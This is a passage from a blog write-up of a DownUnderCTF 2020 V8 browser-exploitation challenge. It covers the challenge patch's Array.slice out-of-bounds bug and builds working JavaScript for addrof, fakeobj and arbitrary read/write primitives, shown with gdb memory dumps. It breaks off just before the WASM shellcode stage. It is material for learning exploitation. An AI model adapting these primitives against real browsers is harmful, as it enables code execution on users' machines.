Security Certified Professional OSED - Offensive Security Exploit Developer CRTE - Certified Red Team Expert CRTO - Certified Red Team Operator\nNote: Some of the thumbnails featured in the blog are from Bleeping Computer, and a glitch effect has been applied using Glitch Generator.\n","date":"1 January 0001","permalink":"/about/","section":"PwnFuzz","summary":"Hello, I\u0026rsquo;m Robin! I\u0026rsquo;m a cybersecurity enthusiast who loves diving into binary exploitation and reverse engineering. Right now, I\u0026rsquo;m also exploring the world of game hacking, juggling between different areas of security and hacking.","title":"About Me"},{"content":"","date":null,"permalink":"/tags/ctf-pwn-v8-browser-pwn/","section":"Tags","summary":"","title":"Ctf, Pwn, V8, Browser Pwn"},{"content":"In-depth write-up of the V8 challenge from DownUnderCTF 2020.\nForeword #Unfortunately I couldn\u0026rsquo;t solve the challenge, as it was supposed to be easy one still I couldn\u0026rsquo;t but I thought I should do a post with the writeups/exploits from other people and make it very explainative such that I can use for reference later so when I\u0026rsquo;ll get stucked I can take a look and move on with research and who knows maybe it\u0026rsquo;ll be helpful for others too. This write-up mostly revolve around the references listed at the bottom.\nSetup #Although, there\u0026rsquo;s not much to setup as the author was kind enough to give us the d8 binary which is the build version of the debug version and patch file. Although, having a release version is best, let\u0026rsquo;s build it.\nd4mian@pwnbox:~$ fetch v8 d4mian@pwnbox:~$ cd v8 d4mian@pwnbox:~/v8$ ./build/install-build-deps.sh d4mian@pwnbox:~/v8$ git checkout 47054c840e26394dea0e36df47884202a15dd16d # Commit was mentioned in the challenge d4mian@pwnbox:~/v8$ gclient sync d4mian@pwnbox:~/v8$ git apply ../patch.diff # Path to the patch file provided d4mian@pwnbox:~/v8$ ./tools/dev/v8gen.py x64.release d4mian@pwnbox:~/v8$ ninja -C ./out.gn/x64.release d4mian@pwnbox:~/v8$ ./tools/dev/v8gen.py x64.debug d4mian@pwnbox:~/v8$ ninja -C ./out.gn/x64.debug Credit: Faith\nPatch #As we used to reverse engineer the binary in a typical pwn challenge but in case browser pwn, we get a patch file with the commit hash so that we can apply the patch and build the d8, let\u0026rsquo;s analyse the challenges made by the author:-\ndiff --git a/src/builtins/array-slice.tq b/src/builtins/array-slice.tq index 7b82f2bda3..4b9478f84e 100644 --- a/src/builtins/array-slice.tq +++ b/src/builtins/array-slice.tq @@ -101,7 +101,14 @@ macro HandleFastSlice( // to be copied out. Therefore, re-check the length before calling // the appropriate fast path. See regress-785804.js if (SmiAbove(start + count, a.length)) goto Bailout; - return ExtractFastJSArray(context, a, start, count); + // return ExtractFastJSArray(context, a, start, count); + // Instead of doing it the usual way, I\u0026#39;ve found out that returning it + // the following way gives us a 10x speedup! + const array: JSArray = ExtractFastJSArray(context, a, start, count); + const newLength: Smi = Cast\u0026lt;Smi\u0026gt;(count - start + SmiConstant(2)) + otherwise Bailout; + array.ChangeLength(newLength); + return array; } case (a: JSStrictArgumentsObject): { goto HandleSimpleArgumentsSlice(a); diff --git a/src/d8/d8.cc b/src/d8/d8.cc index 26ccb62c68..8114a861cc 100644 --- a/src/d8/d8.cc +++ b/src/d8/d8.cc @@ -1342,9 +1342,12 @@ MaybeLocal\u0026lt;Context\u0026gt; Shell::CreateRealm( } delete[] old_realms; } - Local\u0026lt;ObjectTemplate\u0026gt; global_template = CreateGlobalTemplate(isolate); + // Remove globals + //Local\u0026lt;ObjectTemplate\u0026gt; global_template = CreateGlobalTemplate(isolate); Local\u0026lt;Context\u0026gt; context = - Context::New(isolate, nullptr, global_template, global_object); + //Context::New(isolate, nullptr, global_template, global_object); + Context::New(isolate, nullptr, ObjectTemplate::New(isolate), + v8::MaybeLocal\u0026lt;Value\u0026gt;()); DCHECK(!try_catch.HasCaught()); if (context.IsEmpty()) return MaybeLocal\u0026lt;Context\u0026gt;(); InitializeModuleEmbedderData(context); @@ -2285,10 +2288,13 @@ void Shell::Initialize(Isolate* isolate, D8Console* console, v8::Isolate::kMessageLog); } + // Prevent `import(\u0026#34;stuff\u0026#34;)` + /* isolate-\u0026gt;SetHostImportModuleDynamicallyCallback( Shell::HostImportModuleDynamically); isolate-\u0026gt;SetHostInitializeImportMetaObjectCallback( Shell::HostInitializeImportMetaObject); + */ #ifdef V8_FUZZILLI // Let the parent process (Fuzzilli) know we are ready. @@ -2316,9 +2322,11 @@ Local\u0026lt;Context\u0026gt; Shell::CreateEvaluationContext(Isolate* isolate) { // This needs to be a critical section since this is not thread-safe base::MutexGuard lock_guard(context_mutex_.Pointer()); // Initialize the global objects - Local\u0026lt;ObjectTemplate\u0026gt; global_template = CreateGlobalTemplate(isolate); + //Local\u0026lt;ObjectTemplate\u0026gt; global_template = CreateGlobalTemplate(isolate); EscapableHandleScope handle_scope(isolate); - Local\u0026lt;Context\u0026gt; context = Context::New(isolate, nullptr, global_template); + //Local\u0026lt;Context\u0026gt; context = Context::New(isolate, nullptr, global_template); + Local\u0026lt;Context\u0026gt; context = Context::New(isolate, nullptr, + ObjectTemplate::New(isolate)); DCHECK(!context.IsEmpty()); if (i::FLAG_perf_prof_annotate_wasm || i::FLAG_vtune_prof_annotate_wasm) { isolate-\u0026gt;SetWasmLoadSourceMapCallback(ReadFile); diff --git a/src/objects/js-array.tq b/src/objects/js-array.tq index a4d4b9d356..7e2738b96e 100644 --- a/src/objects/js-array.tq +++ b/src/objects/js-array.tq @@ -26,6 +26,10 @@ macro CreateArrayIterator(implicit context: NativeContext)( } extern class JSArray extends JSObject { + macro ChangeLength(newLength: Smi) { + this.length = newLength; + } + macro IsEmpty(): bool { return this.length == 0; } Let\u0026rsquo;s break it down, the first changes made in array-slice.tq is our cue here, we need to focus on that:-\ndiff --git a/src/builtins/array-slice.tq b/src/builtins/array-slice.tq index 7b82f2bda3..4b9478f84e 100644 --- a/src/builtins/array-slice.tq +++ b/src/builtins/array-slice.tq @@ -101,7 +101,14 @@ macro HandleFastSlice( // to be copied out. Therefore, re-check the length before calling // the appropriate fast path. See regress-785804.js if (SmiAbove(start + count, a.length)) goto Bailout; - return ExtractFastJSArray(context, a, start, count); + // return ExtractFastJSArray(context, a, start, count); + // Instead of doing it the usual way, I\u0026#39;ve found out that returning it + // the following way gives us a 10x speedup! + const array: JSArray = ExtractFastJSArray(context, a, start, count); + const newLength: Smi = Cast\u0026lt;Smi\u0026gt;(count - start + SmiConstant(2)) + otherwise Bailout; + array.ChangeLength(newLength); + return array; } case (a: JSStrictArgumentsObject): { goto HandleSimpleArgumentsSlice(a); Now, what changed here is the instead of directly returning the array with ExtractFastJSArray the patch stores it in variable array then define the new length with the line const newLength: Smi = Cast\u0026lt;Smi\u0026gt;(count - start + SmiConstant(2)) which subtracts the count from the start(we will see this in action soon enough), then add 2 to the result and cast it to the smi and then the next line array.ChangeLength(newLength) which updates the length of the array then return the array. Other changes made to the v8 here is the security check so that the we cannot use import (flag_location) which will result in unresolved import showing the flag, this happened in the iSpamAndHex\u0026rsquo;s CTF v8 challenge, write-up was by p4 team, a very smart move. Now, another interesting change made to the js-array.tq which changes the length of the of an array.\nThe vulnerability lies in how the slice allows us to access the element of a JSArray, if we give slice(0) we will be able to access the 2 index from the array which will result in OOB read of JSArrayMap and it\u0026rsquo;s element pointer.\nSo, how do we exploit it? Since this aimed at the very begineers who wanted to pwn that v8 challenge but couldn\u0026rsquo;t(I can relate), I\u0026rsquo;ll go over almost every concept we need to know in order to execute a shellcode. Without further ado, let\u0026rsquo;s dive right in.\nPointer Compression #Pointer compression has been introduced in the v8 engine which increased the performance of the engine by greater margin. What this means is the upper 32 bytes of the address known as isolate root would remain constant for the process while the lower 32 bits of the address can be changed dynamically, as opposed to the OOB challenge of the *ctf which is a good starting point in the browser exploitation, it didn\u0026rsquo;t had the pointer compression. For this challenge, we have to deal with the pointer compression too , it may sound like we have do lots of things to defeat this mechanism, we really don\u0026rsquo;t.\nWriteup for the OOB challenge from *ctf can be found here\nAccording to this, which is written by the author himself:-\nWell, to start off with, there isn’t really an easy way to leak the isolate root (upper 32 bits of the V8 heap memory space) through JS, but if you think about it, there really isn’t a need to do that in the first place.\nIf you can massage a vulnerability into addrof and fakeobj primitives, you can fake a JSArray and control the elements pointer to gain arbitrary r/w primitives. The catch here is that these primitives would only let you perform arbitrary reads and writes within the V8 heap. Why you ask? Because the elements pointer of a JSArray stores a 32-bit compressed pointer, and if you change it to an arbitrary 32-bit memory address, performing reads and writes using this elements pointer will cause V8 to add the isolation root.\nThe way around this is to then go the classic route of allocating an ArrayBuffer on the V8 heap and overwriting its backing store to an arbitrary 64-bit memory address. Then, performing reads and writes with it using either a TypedArray or a DataView object will grant you an arbitrary r/w primitive within the entire 64-bit address space.\nThe reason this works is because the backing stores of array buffers are allocated using PartitionAlloc (I’m not entirely sure if this is still the case, but this was the case approximately 3-4 years ago, and I haven’t seen anything to suggest that it has changed). All PartitionAlloc allocations go on a separate memory region that is not within the V8 heap. This means that the backing store pointer needs to be stored as an uncompressed 64-bit pointer, since its upper 32 bits are not the same as the isolate root and thus have to be stored with the pointer.\nFrom above, we know that we need to understand about the fakeobj and addrof because that\u0026rsquo;s what we need for now. Since, we know the vulnerability, we have to now move on to the next part of the exploitation, first we will go through the debugging and understand the structure of the JSArray and what is Map and how exactly we can do with the vulnerability and most importantly how.\nHandleFastSlice in action #Enough of the theory part, let\u0026rsquo;s move to some practical part and see how things are at the low level. Since we have the d8 binary from the challenge, let\u0026rsquo;s first see the array structure:-\nI am using gdb-gef for analysing the memory, you can find it here.\nLet\u0026rsquo;s run the binary within the gdb:-\nd4mian@pwnbox:~/CTFs$ gdb ./d8 GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git Copyright (C) 2018 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type \u0026#34;show copying\u0026#34; and \u0026#34;show warranty\u0026#34; for details. This GDB was configured as \u0026#34;x86_64-linux-gnu\u0026#34;. Type \u0026#34;show configuration\u0026#34; for configuration details. For bug reporting instructions, please see: \u0026lt;http://www.gnu.org/software/gdb/bugs/\u0026gt;. Find the GDB manual and other documentation resources online at: \u0026lt;http://www.gnu.org/software/gdb/documentation/\u0026gt;. For help, type \u0026#34;help\u0026#34;. Type \u0026#34;apropos word\u0026#34; to search for commands related to \u0026#34;word\u0026#34;... GEF for linux ready, type `gef\u0026#39; to start, `gef config\u0026#39; to configure 75 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6 [*] 5 commands could not be loaded, run `gef missing` to know why. Reading symbols from ./d8...(no debugging symbols found)...done. gef➤ run --allow-natives-syntax Starting program: /home/d4mian/CTFs/d8 --allow-natives-syntax [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. [New Thread 0x7ffff7006700 (LWP 3232)] V8 version 8.7.9 d8\u0026gt; var a = [1.1, 1.2, 1.4]; I have used the allow-naitves-syntax flag which will allow us to use functions like %DebugPrint() which prints the information of the variable and it\u0026rsquo;s associated object and their address which makes debug part of the binary.\nd8\u0026gt; %DebugPrint(a); DebugPrint: 0x199508084a31: [JSArray] - map: 0x1995082438fd \u0026lt;Map(PACKED_DOUBLE_ELEMENTS)\u0026gt; [FastProperties] - prototype: 0x19950820a555 \u0026lt;JSArray[0]\u0026gt; - elements: 0x199508084a11 \u0026lt;FixedDoubleArray[3]\u0026gt; [PACKED_DOUBLE_ELEMENTS] - length: 3 - properties: 0x1995080426dd \u0026lt;FixedArray[0]\u0026gt; { 0x199508044649: [String] in ReadOnlySpace: #length: 0x199508182159 \u0026lt;AccessorInfo\u0026gt; (const accessor descriptor) } - elements: 0x199508084a11 \u0026lt;FixedDoubleArray[3]\u0026gt; { 0: 1.1 1: 1.2 2: 1.4 } 0x1995082438fd: [Map] - type: JS_ARRAY_TYPE - instance size: 16 - inobject properties: 0 - elements kind: PACKED_DOUBLE_ELEMENTS - unused property fields: 0 - enum length: invalid - back pointer: 0x1995082438d5 \u0026lt;Map(HOLEY_SMI_ELEMENTS)\u0026gt; - prototype_validity cell: 0x199508182445 \u0026lt;Cell value= 1\u0026gt; - instance descriptors #1: 0x19950820abd9 \u0026lt;DescriptorArray[1]\u0026gt; - transitions #1: 0x19950820ac25 \u0026lt;TransitionArray[4]\u0026gt;Transition array #1: 0x199508044f5d \u0026lt;Symbol: (elements_transition_symbol)\u0026gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -\u0026gt; 0x199508243925 \u0026lt;Map(HOLEY_DOUBLE_ELEMENTS)\u0026gt; - prototype: 0x19950820a555 \u0026lt;JSArray[0]\u0026gt; - constructor: 0x19950820a429 \u0026lt;JSFunction Array (sfi = 0x19950818b399)\u0026gt; - dependent code: 0x1995080421e1 \u0026lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)\u0026gt; - construction counter: 0 Using DebugPrint(a) we got a lot of information about the variable a, better to break it down and understand the output one by one. First off, DebugPrint tells us that JSArray is located at the 0x199508084a31 and the map of the JSArray is located at the 0x1995082438fd and the address 0x199508084a11 is pointing to the elements stored. The Debug Output is enough to understand what is here if you\u0026rsquo;ve done binary exploitation.\nFrom the vulnerability, we know that we can access start + 2 elements of the JSArray, which if you go through the above output would be JSArrayMap and other would be FixedDoubleArray. Now, we know that we can access the map and the pointer to the elements of the JSArray, what do we do now?\nIt is true that we read by the slice method but we also need a write primitve, if you remember from the patch file, the length of the JSArray is being extended during the inital call of the HandleFastSlice, which means we can change the content of the JSArrayMap and the FixedDoubleArray which is a pointer to the array\u0026rsquo;s elements. Now, we know what we can do with the vulnerability, let\u0026rsquo;s move on.\nBefore we move on, the address will be represented in the floating point value but for debugging we need the 64 bit representation of the floating value and vice versa, we can use JS to make us some utility function to help out with this.\nvar buf = new ArrayBuffer(8); var f64_buf = new FloatArray(buf); var u64_buf = new Unint32Array(buf); function ftoi(val, size) { f64_buf[0] = val; if(size == 32) { return BigInt(u64_buf[0]); } else if(size == 64) { return BigInt(u64_buf[0]) + BigUint(u64_buf[1] \u0026lt;\u0026lt; 32n); } } function itof(val, size) { if(size == 32) { u64_buf[0] = Number(val \u0026amp; 0xffffffffn); } else if(size == 64) { u64_buf[0] = Number(val \u0026amp; 0xffffffffn) u64_buf[1] = Number(val \u0026lt;\u0026lt; 32n); } return f64_buf[0]; } The above utilites function would change the integer to the float and the float to integer named itof and ftoi respectively. Now, we have the utilties function lets create a JS script in which we can access the array[length + 1] which will give us the JSArray\u0026rsquo;s map and the array[length + 2] which will give us the pointer of the elements stored in the JSArray.\nvar aux_float_arr = [1.1, 2.2, 3.3]; var aux_arr = aux_float_arr.slice(aux_float_arr) /* When we do `aux_float_arr.slice(aux_float_arr)` the slice function will try to show the whole array + 2 more than the actual length of it which will turn into the OOB read. hence leaking the addresses. */ var buf = new ArrayBuffer(8); var f64_buf = new Float64Array(buf); var u64_buf = new Uint32Array(buf); function ftoi(val, size) { f64_buf[0] = val; if(size == 32) { return BigInt(u64_buf[0]); } else if(size == 64) { return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) \u0026lt;\u0026lt; 32n); } } function itof(val, size) { if(size == 32) { u64_buf[0] = Number(val \u0026amp; 0xffffffffn); } else if(size == 64) { u64_buf[0] = Number(val \u0026amp; 0xffffffffn); u64_buf[1] = Number(val \u0026gt;\u0026gt; 32n); } return f64_buf[0]; } // We only get the lower 32 bytes, since that\u0026#39;s what we need because of the pointer compression var flt_arr_map = ftoi(aux_arr[3], 32); // Lower 32 bits of the Map address var elem_arr_ptr = ftoi(aux_arr[4], 32); // Lower 32 bits of the elements pointer console.log(\u0026#34;[+] Float array map: 0x\u0026#34; + flt_arr_map.toString(16)); console.log(\u0026#34;[+] Pointer to array elements: 0x\u0026#34; + elem_arr_ptr.toString(16)); Let\u0026rsquo;s run this script in the release version, as there\u0026rsquo;s no need of the release version I build it for my convenience but use the provided d8 binary if you don\u0026rsquo;t want to go through the hassle of building it from scratch.\ngef➤ r --shell ./xpl.js Starting program: /home/d4mian/CTFs/d8 --shell ./xpl.js [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. [New Thread 0x7ffff7006700 (LWP 12770)] [+] Float array map: 0x82438fd [+] Pointer to array elements: 0x8084e91 V8 version 8.7.9 d8\u0026gt; Successfully, we leaked the pointers of the JSArrayMap and the element pointer. Now, since we can read the address, it\u0026rsquo;s time to see if it possible to leverage this vulnerability to the addrof and fakeobj, but first let\u0026rsquo;s understand what these are.\nJSArrayMap #Before we first dive into those, we must understand what exactly the map is and what could be even done with this?\nMap of an object in JS in context of V8 tells the engine on how the elements are accessed, the reason we have map in the engine because V8 have to be fast enough to access elements, objects and other associated information of the object such that the lookup time would be very less.\nAccording to phrack paper here, the map is defined as:-\nThe Map is a key data structure in v8, containing information such as\nThe dynamic type of the object, i.e. String, Uint8Array, HeapNumber, \u0026hellip; The size of the object in bytes The properties of the object and where they are stored The type of the array elements, e.g. unboxed doubles or tagged pointers The prototype of the object if any While the property names are usually stored in the Map, the property values are stored with the object itself in one of several possible regions. The Map then provides the exact location of the property value in the respective region.\nIt is also mentioned that Maps are very expensive in terms of memory, since V8 have to be faster enough to work through all the objects the Maps are shared and distributed among the objects. So, since we can access the JSArray object map. If we overwrite a JSArray\u0026rsquo;s map we can cause type confusion in the JIT compiler which will lead to unexpected behaviour within the compiler. Now, we have an overall understanding of the what map is, let\u0026rsquo;s try to overwrite the map of the array with any value for a sanity check.\nJust add the following line to the xpl.js:-\naux_arr[3] = itof(1337n, 32); If you\u0026rsquo;re wondering why 3 specifically, if you see the above code snippet, we have 3 elements in aux_arr from index 0-2, then we call slice on the array with the count being the array, because of the patch we know calling the slice will add 2 more to the length than it originally have, hence allowing us to access map of the array and the element pointer.\nLet\u0026rsquo;s run the d8 with the xpl.js of ours and see if it worked or not:-\ngef➤ r --shell --allow-natives-syntax ~/CTFs/xpl.js Starting program: /home/d4mian/Pwning/v8/out.gn/x64.release/d8 --shell --allow-natives-syntax ~/CTFs/xpl.js [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. [New Thread 0x7ffff65fe700 (LWP 2403)] [+] Float array map: 0x82438fd [+] Pointer to array elements: 0x8084ec1 V8 version 8.7.9 d8\u0026gt; It successfully ran, that means it worked. Now, to see if it really worked ot not, we have to analyse the memory, from the leak we know the lower 32 bits of the elements pointer address and with the help of gef\u0026rsquo;s vmmap, we can get isolate root address, with that we can check that the write worked or not.\ngef➤ r --shell --allow-natives-syntax ~/CTFs/xpl.js Starting program: /home/d4mian/Pwning/v8/out.gn/x64.release/d8 --shell --allow-natives-syntax ~/CTFs/xpl.js [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. [New Thread 0x7ffff65fe700 (LWP 2403)] [+] Float array map: 0x82438fd [+] Pointer to array elements: 0x8084ec1 V8 version 8.7.9 d8\u0026gt; ^C Thread 1 \u0026#34;d8\u0026#34; received signal SIGINT, Interrupt. -- snip -- gef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x0000365100000000 0x000036510000c000 0x0000000000000000 rw- 0x000036510000c000 0x0000365100040000 0x0000000000000000 --- 0x0000365100040000 0x0000365100043000 0x0000000000000000 rw- 0x0000365100043000 0x0000365100044000 0x0000000000000000 --- 0x0000365100044000 0x0000365100054000 0x0000000000000000 r-x 0x0000365100054000 0x000036510007f000 0x0000000000000000 --- 0x000036510007f000 0x0000365108040000 0x0000000000000000 --- 0x0000365108040000 0x000036510805f000 0x0000000000000000 r-- -- snip -- The isolate root here is the 0x0000365100000000, we can add the lower 32 bits of the elements pointer i.e. 0x8084ec1 to get the absolute address of the elements pointer, let\u0026rsquo;s see if we successfully overwritten the map or not.\ngef➤ x/40xg 0x0000365100000000 + 0x8084ec1 - 1 0x365108084ec0:\t0x0000000608042a31\t0x3ff199999999999a 0x365108084ed0:\t0x400199999999999a\t0x400a666666666666 0x365108084ee0:\t0x0000000a00000539\t0x0000000a08084ec1 If you can pay attention to the 0x365108084ee0 address, we have lower 32 bits address written with 0x539 which is the hex value of 1337. We overwritten the map successfully. Now, it\u0026rsquo;s time to leverage this to get fakeobj and addrof primitive.\nfakeobj and addrof primtive #First off, we will go over the addrof primitive, this primitive allow us to read the address of a arbitrary JS Object and on the other hand the fakeobj allow us to inject a fake JS Object into the V8 engine. Now, we need to replicate these two primitives, let\u0026rsquo;s do it:-\nvar aux_obj = {\u0026#34;a\u0026#34;: 1} var aux_obj_arr = [aux_obj]; var aux_float_arr = [1.1, 2.2, 3.3]; var aux_arr = aux_float_arr.slice(aux_float_arr) var buf = new ArrayBuffer(8); var f64_buf = new Float64Array(buf); var u64_buf = new Uint32Array(buf); function ftoi(val, size) { f64_buf[0] = val; if(size == 32) { return BigInt(u64_buf[0]); } else if(size == 64) { return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) \u0026lt;\u0026lt; 32n); } } function itof(val, size) { if(size == 32) { u64_buf[0] = Number(val \u0026amp; 0xffffffffn); } else if(size == 64) { u64_buf[0] = Number(val \u0026amp; 0xffffffffn); u64_buf[1] = Number(val \u0026gt;\u0026gt; 32n); } return f64_buf[0]; } var flt_arr_map = ftoi(aux_arr[3], 32); var elem_arr_ptr = ftoi(aux_arr[4], 32); console.log(\u0026#34;[+] Float array map: 0x\u0026#34; + flt_arr_map.toString(16)); console.log(\u0026#34;[+] Pointer to array elements: 0x\u0026#34; + elem_arr_ptr.toString(16)); var elem_obj_arr = elem_arr_ptr - 0xc4n aux_arr[4] = itof((ftoi(aux_arr[4], 64) \u0026amp; 0xffffffff00000000n) + elem_obj_arr, 64); What we did here is, retrieve the address of the aux_arr_obj which is the located at the address elem_arr_ptr - 0xc4n then we change the pointer of the elements to that of the object.\ngef➤ r --shell --allow-natives-syntax ~/CTFs/xpl.js Starting program: /home/d4mian/CTFs/d8 --shell --allow-natives-syntax ~/CTFs/xpl.js [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. [New Thread 0x7ffff7006700 (LWP 4593)] [+] Float array map: 0x82438fd [+] Pointer to array elements: 0x8084f69 [+] Element Object Array: 0x8084ea5 V8 version 8.7.9 d8\u0026gt; %DebugPrint(aux_obj_arr); DebugPrint: 0x194f08084eb5: [JSArray] - map: 0x194f0824394d \u0026lt;Map(PACKED_ELEMENTS)\u0026gt; [FastProperties] - prototype: 0x194f0820a555 \u0026lt;JSArray[0]\u0026gt; - elements: 0x194f08084ea9 \u0026lt;FixedArray[1]\u0026gt; [PACKED_ELEMENTS] - length: 1 - properties: 0x194f080426dd \u0026lt;FixedArray[0]\u0026gt; { 0x194f08044649: [String] in ReadOnlySpace: #length: 0x194f08182159 \u0026lt;AccessorInfo\u0026gt; (const accessor descriptor) } - elements: 0x194f08084ea9 \u0026lt;FixedArray[1]\u0026gt; { 0: 0x194f08084e7d \u0026lt;Object map = 0x194f0824579d\u0026gt; } 0x194f0824394d: [Map] - type: JS_ARRAY_TYPE - instance size: 16 - inobject properties: 0 - elements kind: PACKED_ELEMENTS - unused property fields: 0 - enum length: invalid - back pointer: 0x194f08243925 \u0026lt;Map(HOLEY_DOUBLE_ELEMENTS)\u0026gt; - prototype_validity cell: 0x194f08182445 \u0026lt;Cell value= 1\u0026gt; - instance descriptors #1: 0x194f0820abd9 \u0026lt;DescriptorArray[1]\u0026gt; - transitions #1: 0x194f0820ac55 \u0026lt;TransitionArray[4]\u0026gt;Transition array #1: 0x194f08044f5d \u0026lt;Symbol: (elements_transition_symbol)\u0026gt;: (transition to HOLEY_ELEMENTS) -\u0026gt; 0x194f08243975 \u0026lt;Map(HOLEY_ELEMENTS)\u0026gt; - prototype: 0x194f0820a555 \u0026lt;JSArray[0]\u0026gt; - constructor: 0x194f0820a429 \u0026lt;JSFunction Array (sfi = 0x194f0818b399)\u0026gt; - dependent code: 0x194f080421e1 \u0026lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)\u0026gt; - construction counter: 0 [{a: 1}] d8\u0026gt; \u0026#34;0x\u0026#34;+ftoi(aux_arr[0], 64).toString(16); \u0026#34;0x8084e7d00000002\u0026#34; d8\u0026gt; Remember, when analysing the address, be sure to subtract 1 from it since pointers are tagged.\nSuccess, we changed the element pointer of the JSArray i.e. aux_arr then after that we check the first element of the aux_arr since we put the fake map object i.e. the address of the obj_arr then when we tend to see the content of the element it\u0026rsquo;ll result in the leak of the obj_arr\u0026rsquo;s map. In the context of JIT exploitation, this is what we call addrof since we can get the address of an arbitrary object from the engine.\nNow, we have to write addrof as a function to help later in the exploit:-\nfunction addrof(obj) { aux_arr = aux_float_arr.slice(aux_float_arr) // slice the array to access the map and the element pointer aux_arr[4] = itof((ftoi(aux_arr[4], 64) \u0026amp; 0xffffffff00000000n) + elem_obj_arr, 64); // Change the element pointer to the address of `obj_arr`\u0026#39;s element\u0026#39;s aux_obj_arr[0] = obj; // Place the object at 0th index return ftoi(aux_arr[0], 32) // Get the address of the object } The fakeobj function:-\nfunction fakeobj(addr) { let fake; // Declare the fake variable aux_arr = aux_float_arr.slice(aux_float_arr); // slice the array to access the map and the element pointer aux_arr[0] = itof(addr, 32); // Make the 0th index the address aux_arr[3] = itof((ftoi(aux_arr[3], 64) \u0026amp; 0xffffffff00000000n) + obj_arr_map, 64); // Change the map of the array to object\u0026#39;s map fake = aux_arr[0]; return fake; } We will see how both of these functions can be used in the arbitrary read and write, don\u0026rsquo;t worry if you don\u0026rsquo;t understand because the next section is very detailed.\nArbitrary r/w #From start to end, we had this one goal to get an arbitrary read/write primitive, now it\u0026rsquo;s time to see it in action. First off, we will start off with the arbitray read and see how we can read any arbitrary address with the use of fakeobj and addrof.\nTo perform arbitrary read, what we will do is create a float array and make the element of the 0th index of the float array to the value of the float array\u0026rsquo;s map using slice. Then we set the value of the map to of a fake object then the 3rd index of the float array will be treated as the elemnt pointer of the fake object.\nLet\u0026rsquo;s see it in the d8 shell itself:-\nd8\u0026gt; var a = [1.1, 1.2, 1.3]; undefined d8\u0026gt; %DebugPrint(a); DebugPrint: 0x369d08086c99: [JSArray] - map: 0x369d082438fd \u0026lt;Map(PACKED_DOUBLE_ELEMENTS)\u0026gt; [FastProperties] -- snip -- gef➤ x/10xg 0x369d08086c99 - 0x30 - 1 0x369d08086c68:\t0x0000000008086c39\t0x08042211fffffffe 0x369d08086c78:\t0x0000000608042a31\t0x3ff199999999999a 0x369d08086c88:\t0x3ff3333333333333\t0x3ff4cccccccccccd 0x369d08086c98:\t0x080426dd082438fd\t0x0000000608086c79 \u0026lt;---- JSArray 0x369d08086ca8:\t0xd15095f608042545\t0x626544250000000f element: `0x369d08086c68` 0th element: `0x369d08086c80` The address `0x369d08086c80` points to the first element of the JSArray, if we change this to the map of the fake object Then the address `0x369d08086c98` would be treated as fake object element pointer, so when we try to read the fake_object[0] it will show the address of whatever value is stored at the address `0x369d08086c98 + 0x10`. Let\u0026rsquo;s do this by calling our previous functions fakeobj and addrof:-\nvar rw_helper = [itof(flt_arr_map, 64), 1.1, 2.2, 3.3]; var rw_helper_addr = addrof(rw_helper) \u0026amp; 0xffffffffn; console.log(\u0026#34;[+] Controlled RW helper address: 0x\u0026#34; + rw_helper_addr.toString(16)); let fake = fakeobj(rw_helper_addr - 0x20n); rw_helper[1] = itof((0x8n \u0026lt;\u0026lt; 32n) + addr - 0x8n, 64); What we doing here is, using the rw_helper to be used as the float array then we create a fake objected at the rw_helper_addr - 0x20n then we make the 1st index of the rw_helper\u0026rsquo;s 1st index to the address of the addr, then once we try to access the 0th index value from the rw_helper it\u0026rsquo;ll give us the value stored at the addr.\nRunning this:-\ngef➤ r --shell --allow-natives-syntax ~/CTFs/xpl.js Starting program: /home/d4mian/CTFs/d8 --shell --allow-natives-syntax ~/CTFs/xpl.js [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. [New Thread 0x7ffff7006700 (LWP 3206)] [+] Float array map: 0x82438fd [+] Pointer to array elements: 0x8085321 [+] Pointer to object array elements: 0x8085265 [+] Object array map: 0x824394d [+] Controlled RW helper address: 0x8085711 V8 version 8.7.9 d8\u0026gt; \u0026#34;0x\u0026#34;+ftoi(rw_helper[0], 32).toString(16); \u0026#34;0x82438fd\u0026#34; -- snip -- gef➤ x/xg 0x8085711 + 0x00003e3a00000000 - 1 0x3e3a08085710:\t0x080426dd082438fd Awesome, we successfully got the value of the rw_helper\u0026rsquo;s array address. Now, we need to leverage this to the arbitrary write, before moving on let\u0026rsquo;s make a function arb_read:-\nfunction arb_read(addr) { let fake = fakeobj(rw_helper_addr - 0x20n); rw_helper[1] = itof((0x8n \u0026lt;\u0026lt; 32n) + addr - 0x8n, 64); return ftoi(fake[0], 64); } Just like the arbitrary read, we will use the fakeobj and addrof to write to a memory location. What we will do here is we inject a fake object i.e. rw_helper array\u0026rsquo;s address then we make the 1st index of the rw_helper pointing to the address we want to write to. then we do fake[0] = val, we will write the value to the address pointed by the fake\u0026rsquo;s 0th index.\nFor now, let\u0026rsquo;s create a function named arb_write which is based on the logic above:-\nfunction arb_write(addr, value) { let fake = fakeobj(rw_helper_addr - 0x20n); rw_helper[1] = itof((0x8n \u0026lt;\u0026lt; 32n) + addr - 0x8n, 64); fake[0] = itof(value, 64); } Shellcode and Profit #Although, because of the pointer compression we can\u0026rsquo;t just directly write to any hook functions and just let it be called, because of the pointer compression we can only write to the heap addresspace but as suggest on the article that I linked earlier, it is mentioned that we can create a WebAssembly Page which is by default marked as RWX which is perfect candidate for the shellcode. If we create a wasm function whose 